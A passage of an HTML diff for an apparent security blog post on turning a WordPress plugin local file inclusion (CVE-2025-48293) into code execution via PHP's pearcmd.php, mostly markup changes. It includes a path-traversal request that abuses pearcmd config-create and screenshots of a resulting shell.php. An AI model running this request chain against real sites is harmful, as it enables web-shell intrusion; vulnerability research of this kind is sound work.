+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$ok</span> <span class="o">=</span> <span class="nv">$cmd</span><span class="o">-&gt;</span><span class="na">run</span><span class="p">(</span><span class="nv">$command</span><span class="p">,</span> <span class="nv">$opts</span><span class="p">,</span> <span class="nv">$params</span><span class="p">);</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><h2 class="heading-element" id="flow"><span>Flow</span>
   <a href="#flow" class="heading-mark">
@@ -1003,12 +1003,12 @@ From PHP <code>7.4</code> onward, PHP must be compiled with <code>--with-pear</c
 </h2><ol>
 <li>Send a GET request:</li>
 </ol>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-http"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">GET /wp-admin/admin-ajax.php?action=geo_mashup_query&amp;object_ids=2&amp;template=../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/test_root_path+test_filename.php</span></span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">GET /wp-admin/admin-ajax.php?action=geo_mashup_query&amp;object_ids=2&amp;template=../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/test_root_path+test_filename.php</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><ol start="2">
 <li>
@@ -1033,10 +1033,10 @@ From PHP <code>7.4</code> onward, PHP must be compiled with <code>--with-pear</c
   <a href="#exploit" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><p>Leveraging <a href="https://w41bu1.github.io/2025-10-13-cve-2025-48293/"target="_blank" rel="external nofollow noopener noreferrer">CVE-2025-48293</a> analyzed earlier to expand into an exploit via <code>pearcmd.php</code></p>
+</h2><p>Leveraging <a href="https://w41bu1.github.io/2025-10-13-cve-2025-48293/" target="_blank" rel="external nofollow noopener noreferrer">CVE-2025-48293</a> analyzed earlier to expand into an exploit via <code>pearcmd.php</code></p>
 <p>Send a request with an LFI payload pointing to <code>pearcmd.php</code>:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-http"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
@@ -1068,13 +1068,13 @@ From PHP <code>7.4</code> onward, PHP must be compiled with <code>--with-pear</c
 </span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Site</span><span class="o">:</span> <span class="l">same-origin</span>
 </span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-User</span><span class="o">:</span> <span class="l">?1</span>
 </span></span><span class="line"><span class="cl"><span class="n">X-PwnFox-Color</span><span class="o">:</span> <span class="l">blue</span>
-</span></span><span class="line"><span class="cl"><span class="n">Priority</span><span class="o">:</span> <span class="l">u=0, i</span></span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">Priority</span><span class="o">:</span> <span class="l">u=0, i</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
 </div>
 </div><p><strong>Successful response returned</strong>:</p>
-<p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/res2.png" title="Successful response" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/res2.png" data-sub-html="<h2>res2</h2><p>Successful response</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/res2.png' alt="res2" height="937" width="1536"></a><figcaption class="image-caption">Successful response</figcaption>
+<p><figure><a class="lightgallery" target="_blank" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/res2.png" title="Successful response" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/res2.png" data-sub-html="<h2>res2</h2><p>Successful response</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/res2.png' alt="res2" height="937" width="1536"></a><figcaption class="image-caption">Successful response</figcaption>
   </figure></p>
 <p>Accessing <code>shell.php</code>:</p>
-<p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/shell.png" title="shell.php" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/shell.png" data-sub-html="<h2>shell</h2><p>shell.php</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/shell.png' alt="shell" height="1078" width="1919"></a><figcaption class="image-caption">shell.php</figcaption>
+<p><figure><a class="lightgallery" target="_blank" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/shell.png" title="shell.php" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/shell.png" data-sub-html="<h2>shell</h2><p>shell.php</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/shell.png' alt="shell" height="1078" width="1919"></a><figcaption class="image-caption">shell.php</figcaption>
   </figure></p></div><hr class="awesome-hr" />
     <h2 id="see-also">Related Content</h2>
     <ul><li>
@@ -1094,7 +1094,7 @@ From PHP <code>7.4</code> onward, PHP must be compiled with <code>--with-pear</c
       </div><div class="post-info-license">
             <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
           </div></div><div class="post-info-line">
-        <div class="post-info-md"><span><a href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/index.md" title="Read Markdown" class="link-to-markdown">Read Markdown</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/index.en.md?plain=1" title="View source"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-source">View source</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/edit/main/content/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/index.en.md" title="Edit this page"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-edit">Edit this page</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/issues/new?title=[BUG]%20Exploiting&#43;LFI2RCE&#43;Vulnerability&#43;via&#43;PHP&#43;PEARCMD&amp;body=%7cField%7cValue%7c%0A%7c-%7c-%7c%0A%7cTitle%7cExploiting&#43;LFI2RCE&#43;Vulnerability&#43;via&#43;PHP&#43;PEARCMD%7c%0A%7cURL%7chttp://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/%7c%0A%7cFilename%7chttps://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/index.en.md?plain=1%7c" title="Report issue"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-report">Report issue</a></span><span><a href="vscode://file//home/w41/Project/w41bu1.github.io/content/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/index.en.md" title="Open in editor"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-vscode">Open in editor</a></span></div>
+        <div class="post-info-md"><span><a href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/index.md" title="Read Markdown" class="link-to-markdown">Read Markdown</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/index.en.md?plain=1" title="View source" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-source">View source</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/edit/main/content/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/index.en.md" title="Edit this page" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-edit">Edit this page</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/issues/new?title=[BUG]%20Exploiting&#43;LFI2RCE&#43;Vulnerability&#43;via&#43;PHP&#43;PEARCMD&amp;body=%7cField%7cValue%7c%0A%7c-%7c-%7c%0A%7cTitle%7cExploiting&#43;LFI2RCE&#43;Vulnerability&#43;via&#43;PHP&#43;PEARCMD%7c%0A%7cURL%7chttp://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/%7c%0A%7cFilename%7chttps://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/index.en.md?plain=1%7c" title="Report issue" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-report">Report issue</a></span><span><a href="vscode://file//home/w41/Project/w41bu1.github.io/content/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/index.en.md" title="Open in editor" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-vscode">Open in editor</a></span></div>
         <div class="post-info-share">
           <span><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/" data-title="Exploiting LFI2RCE Vulnerability via PHP PEARCMD" data-hashtags="analyst,lfi,plugin,pearcmd"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
   <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/" data-hashtag="analyst"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
